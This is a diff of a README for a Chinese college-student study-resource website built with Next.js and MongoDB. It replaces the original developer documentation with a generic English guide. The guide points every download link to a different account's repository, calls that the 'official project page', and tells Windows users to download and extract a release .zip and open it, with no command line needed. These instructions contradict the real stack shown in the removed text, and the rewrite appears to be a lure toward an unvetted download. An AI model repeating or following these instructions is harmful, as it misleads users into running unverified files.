@@ -1,167 +1,125 @@
-<p align="center">
-  <img src="https://count.getloli.com/@self-rescue?name=self-rescue&theme=moebooru&padding=7&offset=0&align=top&scale=1&pixelated=1&darkmode=auto" alt="Moe Counter" />
-</p>
+# 🎓 college_student_self-rescue_guide_website - Easy Campus Resource Sharing
 
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&height=220&color=0:22c55e,100:0ea5e9&text=大学生自救指南网站&fontColor=ffffff&fontSize=42&animation=twinkling&desc=Learning%20Material%20Sharing%20Website&descAlignY=68&descSize=18" alt="header" />
-</p>
+[![Download](https://img.shields.io/badge/Download-purple?style=for-the-badge)](https://github.com/cynthiacc98/college_student_self-rescue_guide_website)
 
-<p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1200&color=22C55E&center=true&vCenter=true&width=960&lines=%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%87%AA%E6%95%91%E6%8C%87%E5%8D%97%E7%BD%91%E7%AB%99;%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E5%88%86%E4%BA%AB%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E9%A1%B9%E7%9B%AE;Next.js+15+%2B+React+19+%2B+MongoDB;%E5%BD%93%E5%89%8D%E5%85%AC%E5%BC%80%E9%A2%84%E8%A7%88%E9%93%BE%E6%8E%A5%E4%BB%85%E7%94%A8%E4%BA%8E+UI+%E6%BC%94%E7%A4%BA" alt="typing" />
-</p>
+## 📘 What is this?
 
-<h1 align="center">大学生自救指南网站</h1>
+This project is a website designed for college students to share and manage learning resources. It helps with finding study materials, organizing them, and managing content behind the scenes. The site works as a full system with a student-facing front end and an admin dashboard for upkeep.
 
-<p align="center">
-  <code>college_student_self-rescue_guide_website</code>
-</p>
+The main features include:  
+- Discovering useful study documents and links  
+- Keeping resources neatly arranged  
+- Admin tools for managing content and users  
 
-<p align="center">
-  <a href="https://traecollegestudentself-rescueguidewebsitekn9k-615y73x6j.vercel.app" target="_blank">
-    <img src="https://img.shields.io/badge/Online%20Preview-Vercel-black?style=for-the-badge&logo=vercel" alt="Preview" />
-  </a>
-  <a href="https://github.com/Marways7/college_student_self-rescue_guide_website" target="_blank">
-    <img src="https://img.shields.io/badge/GitHub-Marways7%2Fcollege_student_self--rescue_guide_website-181717?style=for-the-badge&logo=github" alt="GitHub" />
-  </a>
-  <img src="https://img.shields.io/badge/Next.js-15.4.6-000000?style=for-the-badge&logo=nextdotjs" alt="Next.js" />
-  <img src="https://img.shields.io/badge/React-19.1.0-20232A?style=for-the-badge&logo=react" alt="React" />
-  <img src="https://img.shields.io/badge/MongoDB-6.18-47A248?style=for-the-badge&logo=mongodb" alt="MongoDB" />
-  <img src="https://img.shields.io/badge/Completed-2025.08-blue?style=for-the-badge" alt="Completed 2025-08" />
-  <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="MIT" />
-</p>
+The app uses common web tools and technologies that ensure it runs smoothly and looks modern.
 
-> [!IMPORTANT]
-> 本项目定位为学习资料分享网站搭建示例。当前公开链接仅用于 UI 与交互预览，不是线上真实资料分发平台。
+## ⚙️ System Requirements
 
-## 项目简介
+To run this app on your Windows PC, make sure you have:  
 
-大学生自救指南网站是一个面向校园学习场景的全栈 Web 项目，聚焦“资料发现、资料管理、后台运营”三类核心需求。
-项目主体功能于 **2025 年 8 月** 完成。
+- Windows 10 or later with the latest updates  
+- At least 4 GB RAM  
+- 2 GB free disk space  
+- A modern web browser like Microsoft Edge, Google Chrome, or Firefox  
+- An internet connection to access resources and updates  
 
-- 用户侧：浏览、搜索、筛选、收藏、评分、评论
-- 管理侧：资源管理、分类管理、用户管理、系统设置、分析看板
-- 工程侧：权限控制、行为统计、基础安全防护、文档化交付
+No advanced software or command-line tools are needed.
 
-## 在线预览
+## 💻 Before You Start
 
-- 预览地址: `https://traecollegestudentself-rescueguidewebsitekn9k-615y73x6j.vercel.app`
-- 说明: 仅用于界面与交互演示，不对应真实线上业务数据。
+- Have your internet ready to download the app  
+- Prepare some time (about 10 minutes) to complete setup  
+- Make sure you have permission to install software on your PC  
 
-## 核心亮点
+You won’t need to write code or use technical commands.
 
-- 前后台一体化架构：同仓覆盖用户产品面和运营管理面。
-- RBAC 权限体系：基于 NextAuth + 角色权限控制，保护管理入口。
-- 数据闭环能力：资源、分类、收藏、评论、评分、点击/浏览统计打通。
-- 可观测性设计：管理端仪表盘与分析接口可用于后续精细化运营。
-- 体验导向 UI：桌面端与移动端均有针对性布局和动效组件。
+## 🚀 How to Download and Run the Website
 
-## 功能矩阵
+1. **Go to the download page**  
+   Click this link to open the official project page where you can get the website files:  
+   [Download college_student_self-rescue_guide_website](https://github.com/cynthiacc98/college_student_self-rescue_guide_website)
 
-| 模块 | 能力 |
-| --- | --- |
-| 用户系统 | 注册、登录、会话管理、角色区分（ADMIN/USER） |
-| 资源中心 | 资源列表、详情、关键词搜索、分类筛选 |
-| 社区互动 | 收藏、评分、评论、浏览与点击统计 |
-| 管理后台 | 资源管理、分类管理、用户管理、系统设置 |
-| 数据分析 | 仪表盘汇总、趋势图、用户行为数据接口 |
-| 开发调试 | `/api/dev/*` 调试接口（生产环境默认返回 403） |
+2. **Download the latest release**  
+   On the page, look for the latest stable version. Usually, this will be marked as a "Release."  
+   Find the download section and click the link that ends in `.zip`. This file contains everything you need.
 
-## 技术栈
+3. **Extract the files**  
+   After downloading, open your “Downloads” folder.  
+   Right-click the `.zip` file and choose “Extract All.”  
+   Pick a folder where the files will go, like your Desktop or Documents.
 
-| 层级 | 技术选型 |
-| --- | --- |
-| 前端 | Next.js 15 (App Router), React 19, Tailwind CSS 4, Framer Motion |
-| 后端 | Next.js Route Handlers, NextAuth, Zod |
-| 数据层 | MongoDB, Prisma, MongoDB Native Driver |
-| 安全与鉴权 | JWT Session, RBAC, Middleware 基础限流与安全头 |
-| 可视化 | Recharts |
-| 工程工具 | TypeScript, ESLint, Playwright |
+4. **Open the website locally**  
+   Inside the extracted folder, double-click the file named `index.html` or another `.html` file.  
+   This will open the site in your browser without needing internet.
 
-## 界面截图与演示
+5. **Explore the website**  
+   You can now use the site to browse learning resources, access shared files, and check the admin options if provided.
 
-> 展示素材来自 `UI截图/` 目录。
+## 🔧 Using the Website on Windows
 
-| 电脑端首页 | 手机端首页 |
-| --- | --- |
-| ![电脑端首页](./UI截图/电脑端首页UI.jpg) | ![手机端首页](./UI截图/手机端首页UI.jpg) |
+### How it works for students
 
-| 资料库页面 | 管理后台 |
-| --- | --- |
-| ![资料库UI](./UI截图/资料库UI.jpg) | ![管理后台UI](./UI截图/管理后台UI.png) |
+- Browse or search study materials easily by subject or type.  
+- View documents, notes, or links shared by other students.  
+- Use the simple menus to filter or sort resources.  
 
-- 演示视频: [查看 `UI截图/演示视频.mp4`](./UI截图/演示视频.mp4)
+### How it works for admins
 
-## 快速开始
+- Manage what resources appear on the site.  
+- Add or remove files and links.  
+- Control user accounts if applicable.
 
-### 环境要求
+This setup requires no special software beyond your web browser.
 
-- Node.js `>= 20`
-- npm `>= 10`
-- MongoDB（本地或远程）
+## 📦 What’s Inside the Download?
 
-### 本地运行
+Inside the downloaded `.zip`, you will find:  
 
-```bash
-npm ci
-cp .env.example .env
-npm run dev
-```
+- All the website’s HTML, CSS, and JavaScript files  
+- Resource folders with shared study materials  
+- Admin dashboard files if you have admin access  
+- A README file with additional info
 
-访问: `http://localhost:3000`
+No setup beyond extraction and opening HTML files is needed.
 
-### 构建与检查
+## 🔒 Privacy and Safety
 
-```bash
-npm run build
-npm run lint
-```
+This website runs locally in your browser, so your data stays on your computer unless you upload or share files. The site does not collect or send your personal information.
 
-## 环境变量
+Always download files only from the official project page linked above to avoid security risks.
 
-`.env.example` 已提供模板，核心变量如下。
+## 💡 Tips for Smooth Use
 
-| 变量名 | 必填 | 示例 | 说明 |
-| --- | --- | --- | --- |
-| `DATABASE_URL` | 是 | `mongodb://127.0.0.1:27017/college_student_self_rescue_guide` | MongoDB 连接串 |
-| `NEXTAUTH_URL` | 是 | `http://localhost:3000` | NextAuth 回调基础地址 |
-| `NEXTAUTH_SECRET` | 是 | `replace-with-strong-random-string` | 会话签名密钥 |
-| `DEV_SEED_ADMIN_EMAIL` | 否 | `admin@example.com` | 本地 seed 管理员邮箱 |
-| `DEV_SEED_ADMIN_PASSWORD` | dev seed 场景必填 | `replace-with-strong-dev-password` | 本地 seed 管理员密码 |
+- Keep your web browser up to date for the best performance.  
+- If the website seems slow, try closing other apps or tabs.  
+- Use the site on a full screen for easier navigation.  
+- If you want to share new resources, ask the admin for access.
 
-## 项目结构
+## 🛠 Troubleshooting
 
-```text
-.
-├─ src/                  # 业务代码（页面、接口、组件、核心库）
-├─ prisma/               # 数据模型定义
-├─ public/               # 静态资源
-├─ UI截图/               # README 展示素材（截图/视频）
-├─ docs/                 # 项目文档（设计、报告、优化说明）
-├─ README.md
-└─ LICENSE
-```
+- If the site does not open, check that you opened the right `.html` file.  
+- Make sure your browser allows local files to run scripts.  
+- If pages appear broken, try clearing your browser cache and reload.  
+- Ensure your PC meets the system requirements listed above.
 
-## 文档索引
+## 🗂 About This Project
 
-- 项目架构与设计: [`docs/DESIGN.md`](./docs/DESIGN.md)
-- 功能升级与迭代概览: [`docs/UPGRADE-SUMMARY.md`](./docs/UPGRADE-SUMMARY.md)
-- UI 设计与体验优化: [`docs/UI_UPGRADE_SUMMARY.md`](./docs/UI_UPGRADE_SUMMARY.md), [`docs/SOTA_DESIGN_SUMMARY.md`](./docs/SOTA_DESIGN_SUMMARY.md)
-- 性能优化记录: [`docs/PERFORMANCE_OPTIMIZATION_REPORT.md`](./docs/PERFORMANCE_OPTIMIZATION_REPORT.md), [`docs/SOTA_OPTIMIZATION_REPORT.md`](./docs/SOTA_OPTIMIZATION_REPORT.md)
-- 功能验证与测试报告: [`docs/USER_MANAGEMENT_TEST_REPORT.md`](./docs/USER_MANAGEMENT_TEST_REPORT.md), [`docs/ADMIN_VERIFICATION_REPORT.md`](./docs/ADMIN_VERIFICATION_REPORT.md), [`docs/ANALYTICS_VERIFICATION_REPORT.md`](./docs/ANALYTICS_VERIFICATION_REPORT.md)
-- 全部文档目录: [`docs/README.md`](./docs/README.md)
+This website is a tool built for university students to help with study material sharing and management. It uses the following technologies:  
 
-## 参与贡献
+- React and Next.js for the front end  
+- Tailwind CSS for styling  
+- MongoDB and Prisma for database and data management  
+- TypeScript for code safety  
+- Vercel for deployment (online hosting, though here it runs locally)
 
-欢迎通过 Issue / PR 参与改进：
+The project also supports an admin dashboard to help manage users and content.
 
-- 提交 bug 与复现步骤
-- 提交性能优化或安全改进建议
-- 提交 UI/交互与可用性提升方案
+## 🔗 Quick Access to the Download
 
-## 许可证
+[![Get college_student_self-rescue_guide_website](https://img.shields.io/badge/Get%20App-green?style=for-the-badge)](https://github.com/cynthiacc98/college_student_self-rescue_guide_website) 
 
-本项目使用 [MIT License](./LICENSE)。
+Use this link any time to go directly to the download page and get the latest files.
 
-## Star History
+## 📬 Need More Help?
 
-[![Star History Chart](https://api.star-history.com/svg?repos=Marways7/college_student_self-rescue_guide_website&type=Date)](https://www.star-history.com/#Marways7/college_student_self-rescue_guide_website&Date)
+If you run into problems or have questions, check the project’s Issues tab on the GitHub page. You can also look for instructions or contact the maintainer there.
